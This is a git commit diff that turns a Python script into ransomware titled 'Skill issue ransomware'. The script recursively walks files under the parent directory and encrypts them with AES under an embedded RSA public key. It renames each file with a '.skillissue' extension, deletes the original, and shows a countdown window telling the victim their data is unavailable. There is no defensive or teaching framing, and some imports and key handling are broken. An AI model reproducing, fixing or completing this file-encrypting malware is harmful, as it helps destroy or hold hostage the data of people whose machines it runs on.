343798d2ae9d13878d639697c6f0a05c7d693b00
Shayaan <khanshayaan1@gmail.com>
2023-08-01 10:50:07 +0530

    optimizatioin

--- encryptor.py
+++ encryptor.py
@@ -1,54 +1,101 @@
-import base64
 import os
 from pathlib import Path
-from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.primitives.asymmetric import padding
-from Crypto.Cipher import PKCS1_OAEP, AES
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+import tkinter as tk
 
-# Public key with base 64 encoding
-# if file == "keygn.py" or 
-    # continue
-
-pubkey = '''Enter key'''
-pubkey = base64.b64decode(pubkey)
+# Public key in PEM format
+pubkey = '''MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4AqSFnPjiZ8tk3/7Acws8nZW7RrYy5woVW70lw9NJWy+VY3BdMukH44RMfSaigN5rJ2BN8Uksouc+ZWCtH2IGm6EhtBn6LHv8zAKpPCwGkECq2KnRhWqZkgvNM1iZAf2nB4NLtketbeRMWXXHoT8BFhZSduqVIqpw0pM9f4Ns1Ggl+gcNz6LfgL5nJdM2onPXVmBBwaHhQx2vmfvyaN0aBzW1szLREV4dywF9i7N8bjVCCorKBhhbyaFnLKfaU0F0KLQ3bRbVeqYmgb/DXyHaO5svjLudwaTuxuGrHlUJsNyffKWVoitbBu+St8tytWkKrmTJOIfAb7Ro0vK+tHgawIDAQAB'''
 
 # Function for directory scan
-
 def scanRecurse(baseDir):
     for entry in os.scandir(baseDir):
         if entry.is_file():
             yield entry
-    else:
-        yield from scanRecurse(entry.path)
+        else:
+            yield from scanRecurse(entry.path)
+
 
 # Function for encryption
 def encrypt(dataFile, publicKey):
     # Read data from file
-    extention = dataFile.suffix.loweer()
+    extention = dataFile.suffix.lower()
     dataFile = str(dataFile)
-    with open(dataFile, 'rb') as f:
+    with open(dataFile, "rb") as f:
         data = f.read()
+
     # Convert data to bytes
     data = bytes(data)
 
-    # Create public key
-
-    key = rsa.import_key(publicKey)
+    # Create RSA public key
+    public_key = serialization.load_pem_public_key(publicKey, backend=default_backend())
     sessionKey = os.urandom(16)
 
     # Encrypting session key with public key
-    cipher = padding.OAEP.new(key)
-    encryptedSessionKey = cipher.encrypt(sessionKey)
+    encryptedSessionKey = public_key.encrypt(
+        sessionKey,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None,
+        ),
+    )
 
     # Encrypt data with session key
-    cipher = AES.new(sessionKey, AES.MODE_EAX)
-    ciphertext, tag = cipher.encrypt_and_digest(data)
+    cipher = Cipher(algorithms.AES(sessionKey), modes.CFB(sessionKey))
+    encryptor = cipher.encryptor()
+    ciphertext = encryptor.update(data) + encryptor.finalize()
 
-    # Save the encrypted data to file 
-#     encypt = encrypt(data)
-#     with open("encrypt","wb") as f:
-#         f.write(encrypt)
+    # Save the encrypted data to file
+    fileName = dataFile.split(extention)[0]
+    fileExtention = ".skillissue"
+    encryptedFile = fileName + fileExtention
+    with open(encryptedFile, "wb") as f:
+        [f.write(x) for x in (encryptedSessionKey, ciphertext)]
+    os.remove(dataFile)
 
 
-# passphress =  "cofffe"
-# if usepasss == passphress:
+def countdown(count):
+    hour, minute, second = count.split(":")
+    hour = int(hour)
+    minute = int(minute)
+    second = int(second)
+
+    label["text"] = "{}:{}:{}".format(hour, minute, second)
+
+    if second > 0 or minute > 0 or hour > 0:
+        if second > 0:
+            second -= 1
+        elif minute > 0:
+            minute -= 1
+            second = 59
+        elif hour > 0:
+            hour -= 1
+            minute = 59
+            second = 59
+        root.after(1000, countdown, "{}:{}:{}".format(hour, minute, second))
+
+
+root = tk.Tk()
+root.title("Skill issue ransomware")
+root.geometry("500x300")
+root.resizable(True, True)
+
+label1 = tk.Label(root, text="Your data is unavailable for 5 minutes")
+label1.pack()
+label = tk.Label(root, font=("calibri", 50, "bold"), fg="white", bg="red")
+label.pack()
+
+countdown("00:05:00")
+
+directory = "../"
+excludeExtension = [".py", ".pem", ".exe"]
+for item in scanRecurse(directory):
+    filePath = Path(item)
+    fileType = filePath.suffix.lower()
+    if fileType in excludeExtension:
+        continue
+    encrypt(filePath, pubkey)
+
+root.mainloop()
